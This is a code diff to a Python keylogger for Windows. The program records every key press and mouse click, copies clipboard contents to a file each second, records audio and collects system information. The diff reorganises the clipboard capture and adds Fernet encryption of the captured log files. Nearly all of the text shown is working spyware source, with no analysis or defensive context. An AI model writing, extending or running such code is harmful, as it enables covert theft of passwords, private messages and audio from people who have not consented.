@@ -6,10 +6,12 @@ import pyaudio
 import wave
 import win32clipboard
 import time
+import os
 
+import platform, socket, re, uuid, json, psutil
 from pynput import keyboard, mouse
 from pynput.keyboard import Key, Listener
-import platform, socket, re, uuid, json, psutil
+from cryptography.fernet import Fernet
 
 
 LOG_FILE = "keylogfile.txt"
@@ -24,7 +26,7 @@ audio = pyaudio.PyAudio()
 stop_audio_thread = threading.Event()
 
 def setup_logging():
-    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')
 
 def get_system_info():
     info = {}
@@ -73,25 +75,25 @@ def start_audio_recording():
 def clipboard():
     previous_clipboard_data = ""  # Store the previous clipboard content
     
-    with open(CLIPBOARD, "a") as file:
-        try:
-            while not stop_audio_thread.is_set():
-                win32clipboard.OpenClipboard()
-                pasted_data = win32clipboard.GetClipboardData()
-                win32clipboard.CloseClipboard()
+    try:
+        while not stop_audio_thread.is_set():
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
 
-                # Check if clipboard content has changed
-                if pasted_data != previous_clipboard_data:
+            # Check if clipboard content has changed
+            if pasted_data != previous_clipboard_data:
+                with open(CLIPBOARD, "a") as file:
                     file.write("Clipboard Data : \n")
                     file.write(str(pasted_data) + "\n")
                     file.write("\n")
-                    previous_clipboard_data = pasted_data
-                
-                # Add a small delay to avoid high CPU usage
-                time.sleep(1)
-        except Exception as e:
-            file.write("\n Clipboard could not be copied: " + str(e) + "\n")
+                previous_clipboard_data = pasted_data
 
+            # Add a small delay to avoid high CPU usage
+            time.sleep(1)
+    except Exception as e:
+        with open(CLIPBOARD, "a") as file:
+            file.write("\n Clipboard could not be copied: " + str(e) + "\n")
 
 def on_press(key):
     logging.info(f"[Key Pressed] - {key}")
@@ -111,6 +113,33 @@ def on_click(button, pressed):
         elif button == mouse.Button.middle:
             logging.info('[Mouse Click] - Middle Click')
 
+def encrypt(file_path):
+    try:
+        # Load the key from the file
+        with open('keyfile.key', 'rb') as filekey:
+            key = filekey.read()
+
+        # Load the content of the file
+        with open(file_path, 'rb') as inputfile:
+            original = inputfile.read()
+
+        # Encrypt the content
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(original)
+
+        # Save the encrypted content to a new file
+        encrypted_file_path = file_path + '.encrypted'
+        while os.path.exists(encrypted_file_path):
+            # Ensure file doesn't already exist
+            encrypted_file_path += "_1"
+
+        with open(encrypted_file_path, 'wb') as encrypted_file:
+            encrypted_file.write(encrypted)
+
+        return encrypted_file_path
+    except Exception as e:
+        logging.error(f"An error occurred during encryption: {str(e)}")
+
 def main():
     try:
         setup_logging()
@@ -128,14 +157,22 @@ def main():
             key_listener.join()
             mouse_listener.stop()
 
+        # Encrypt the LOG_FILE and CLIPBOARD
+        encrypted_log_file = encrypt(LOG_FILE)
+        encrypted_clipboard = encrypt(CLIPBOARD)
+
+        # Print the paths of encrypted files
+        print("Encrypted LOG_FILE:", encrypted_log_file)
+        print("Encrypted CLIPBOARD:", encrypted_clipboard)
+
     except Exception as e:
         logging.exception(f"An error occurred: {str(e)}")
+
     finally:
         # Ensure audio is terminated and threads are joined
         stop_audio_thread.set()
         audio_thread.join()
         clipboard_thread.join()
-
 
 if __name__ == "__main__":
     main()
